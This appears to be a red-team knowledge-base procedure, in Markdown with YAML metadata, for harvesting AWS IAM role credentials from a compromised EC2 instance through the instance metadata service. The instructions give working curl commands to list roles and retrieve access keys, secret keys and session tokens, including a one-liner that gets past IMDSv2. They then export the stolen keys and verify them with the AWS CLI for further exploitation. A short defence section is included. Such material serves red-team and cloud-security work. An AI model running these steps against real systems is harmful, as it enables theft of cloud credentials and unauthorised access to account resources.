---
id: 20a46a29-4c22-4a0a-89f3-7afd444f9b79
name: Harvest-AWS-IAM-Credentials-from-Instance-Metadata
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:13.582021+00:00'
updated_at: '2023-04-10T20:21:03.049088+00:00'
tactics:
  - '[[Credential Access]]'
techniques:
  - '[[Unsecured Credentials]]'
  - '[[Cloud Instance Metadata API]]'
sub_techniques: []
tags:
  - '[[tags/After the initial access]]'
  - '[[tags/Cloud - AWS]]'
  - '[[tags/Credential Access]]'
  - '[[tags/Exploitation]]'
commands:
  - '[[commands/curl-retrieve-iam-role-credentials]]'
platforms:
  - AWS
  - Linux
tools: []
validated: true
---

# Harvest-AWS-IAM-Credentials-from-Instance-Metadata

## Summary

This procedure describes how to harvest AWS IAM role credentials from a compromised EC2 instance using the Instance Metadata Service (IMDS). It involves querying the metadata endpoint to retrieve temporary access keys, secret keys, and session tokens associated with an attached IAM role, enabling lateral movement and access to other AWS resources.

## Description

In AWS environments, EC2 instances can be assigned IAM roles that provide temporary security credentials via the Instance Metadata Service accessible at http://169.254.169.254. Once an attacker gains initial access to an EC2 instance (e.g., via SSH or RCE), they can query this service to obtain credentials without needing persistent storage. These credentials are short-lived (typically 1-6 hours) but can be used with the AWS CLI or SDKs to perform actions like launching instances, modifying security groups, or accessing S3 buckets. This technique is particularly effective in cloud environments where roles grant broad permissions, allowing attackers to escalate privileges across the AWS account.

## Requirements

1. Compromised access to an EC2 instance with an attached IAM role (e.g., via initial foothold like SSH or exploited vulnerability).
2. The instance must have IMDSv1 enabled (IMDSv2 requires a session token, which complicates access but can be bypassed if the attacker controls the instance).
3. Basic knowledge of AWS services and the curl tool (pre-installed on most Linux distributions).
4. Network access to the metadata service endpoint (localhost link-local address).

## Defense

- Disable IMDSv1 and enforce IMDSv2 with hop limits to require session tokens for metadata access.
- Use least-privilege IAM roles and monitor credential usage via AWS CloudTrail for anomalous API calls.
- Implement instance profiling and restrict metadata access using tools like AWS Systems Manager or third-party agents.
- Regularly audit and rotate IAM roles, and enable MFA for console access.

## Objectives

1. Retrieve temporary AWS access keys, secret keys, and session tokens from the instance metadata.
2. Use harvested credentials for lateral movement within the AWS environment.
3. Access sensitive AWS resources such as S3 buckets or other EC2 instances.

## Instructions

### Step 1: Verify Instance Metadata Access

**Context**: Confirm that the EC2 instance has access to the metadata service and identify attached IAM roles to target the correct endpoint.

Execute the following command to list available IAM roles:

**Command** ([[commands/curl-list-iam-roles]]):
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

This command queries the metadata service for a list of role names. If IMDSv2 is enforced, prepend a session token acquisition step using `curl -H "X-aws-ec2-metadata-token: $(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")" ...`.

Expected output is a plain text list of role names, e.g., `MyInstanceRole`. If no roles are listed, the instance has no attached IAM role, and this procedure cannot proceed.

### Step 2: Retrieve IAM Role Credentials

**Context**: Use the identified role name to fetch the full security credentials, including access key ID, secret access key, and session token.

**Command** ([[commands/curl-retrieve-iam-role-credentials]]):
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

Replace `ROLE_NAME` with the actual role from Step 1 (e.g., `MyInstanceRole`). This retrieves a JSON response containing the temporary credentials.

Expected output is a JSON object like:
```json
{
  "AccessKeyId" : "ASIA...",
  "SecretAccessKey" : "...",
  "Token" : "...",
  "Expiration" : "2023-04-06T10:00:00Z"
}
```

### Step 3: Validate and Use Credentials

**Context**: Test the harvested credentials by configuring them in the AWS CLI and performing a simple API call to verify access.

Export the credentials as environment variables:
```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
```

Then, test with a describe call:
```bash
aws sts get-caller-identity
```

Expected output confirms the identity and account, e.g., showing the role ARN and account ID. Success indicates valid credentials ready for further exploitation.
